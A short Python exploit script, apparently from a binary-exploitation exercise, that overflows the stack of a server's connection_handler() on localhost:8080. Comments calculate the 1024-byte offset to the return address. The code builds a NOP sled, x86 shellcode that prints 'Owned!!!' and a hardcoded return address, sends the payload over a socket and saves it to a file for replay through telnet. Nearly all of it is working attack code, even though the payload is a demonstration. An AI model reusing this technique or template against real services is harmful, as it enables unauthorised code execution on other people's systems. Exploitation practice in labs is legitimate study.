# Author: Abhinav Thakur
# Email : compilepeace@gmail.com


# Exploiting stack frame of connection_handler()
# esp: 0xbfffe710		ebp: 0xbffff2e8
# our input at address: 0xbfffeeec
# offset to ebp =  0xbffff2e8 - 0xbfffeeec = 1020 bytes
# offset to Return address = (offset to ebp) + 4 = 1024 bytes


import socket
import struct


shellcode = ("\xeb\x19\x31\xc0\x89\xc3\x89\xc1\x89\xc2\xb0\x04\xb3\x02\x59\xb2\x28\xcd\x80\x31\xc0\x89\xc3\xb0\x01\xcd\x80\xe8\xe2\xff\xff\xff\x4f\x77\x6e\x65\x64\x21\x21\x21")
NOP = "\x90"

# 1020 bytes
payload = NOP * 300								
payload += shellcode
payload += NOP * (1020 - len(shellcode) - 300)
payload += NOP * 4								# Overwriting SFP (Saved EBP)
payload += struct.pack("I", 0xbfffeef0)		# Overwriting Return Pointer (Saved EIP)



so = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
so.connect(('localhost', 8080))
so.send(payload)
so.close()


# Exporting malacious input file locally
# command - $ (cat malacious_input; cat) | telnet localhost 8080
fo = open('malacious_input', 'w')
fo.write(payload)
fo.close()
